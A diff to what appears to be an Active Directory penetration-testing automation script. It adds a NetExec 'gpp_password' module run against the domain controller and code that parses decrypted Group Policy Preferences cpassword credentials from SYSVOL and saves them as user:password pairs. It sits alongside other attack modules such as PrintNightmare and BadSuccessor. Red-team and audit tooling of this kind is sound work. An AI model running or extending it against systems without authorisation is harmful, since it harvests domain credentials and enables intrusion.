@@ -7396,6 +7396,7 @@ def run_nxc_enrichment(cfg: Config):
         ("backup_operator",  "smb",  cfg.dc_ip, "backup_operator",  []),
         ("printnightmare",   "smb",  subnet,    "printnightmare",   []),
         ("badsuccessor",     "ldap", cfg.dc_ip, "badsuccessor",     []),
+        ("gpp_password",     "smb",  cfg.dc_ip, "gpp_password",     []),
     ]
 
     for label, proto, target, module, extra in runs:
@@ -7565,6 +7566,7 @@ def consume_nxc_findings(cfg: Config):
       nopac/zerologon  → flag if not patched
       backup_operator  → flag if exploitation succeeded
       badsuccessor     → flag if dMSA objects exist
+      gpp_password     → decrypted GPP cpassword user:pass from SYSVOL
 
     Consolidated extracted creds go to enrich-extracted-creds.txt. Vuln
     flags + values go to enrich-summary.txt."""
@@ -7721,6 +7723,31 @@ def consume_nxc_findings(cfg: Config):
         n = int(m.group(1)) if m else 1
         ok(f"🔥 badsuccessor: {n} dMSA object(s) (BadSuccessor 2024 vuln applicable)")
         summary_lines.append(f"badsuccessor: {n} dMSA object(s)")
+
+    # --- gpp_password: nxc -M gpp_password decrypts the AES-known-key GPP
+    # cpassword from SYSVOL Groups.xml / Services.xml / etc. Output format
+    # varies by nxc version; pair "Username: X" with the following
+    # "Password: Y" and drop empty/None values.
+    gpp_text = _read("gpp_password")
+    gpp_pairs: list[tuple[str, str]] = []
+    last_user: Optional[str] = None
+    for line in gpp_text.splitlines():
+        um = re.search(r"[Uu]ser(?:[Nn]ame)?\s*[:=]\s*(\S+)", line)
+        if um and um.group(1) not in {"None", "null", ""}:
+            last_user = um.group(1)
+        pm = re.search(r"[Pp]assword\s*[:=]\s*(\S+)", line)
+        if pm and last_user and pm.group(1) not in {"None", "null", ""}:
+            gpp_pairs.append((last_user, pm.group(1)))
+            last_user = None
+    if gpp_pairs:
+        gpp_pairs = _dedupe_pairs(gpp_pairs)
+        ok(f"💎 GPP cpassword recovered: {len(gpp_pairs)}")
+        (cfg.work_dir / "enrich-gpp.txt").write_text(
+            "\n".join(f"{u}:{p}" for u, p in gpp_pairs) + "\n")
+        for u, p in gpp_pairs[:5]:
+            detail(f"{u} → {p}")
+            extracted_creds.append(f"{u}:{p}")
+        summary_lines.append(f"GPP cpassword: {len(gpp_pairs)} credential(s) recovered")
 
     # Persist consolidated outputs
     if extracted_creds:
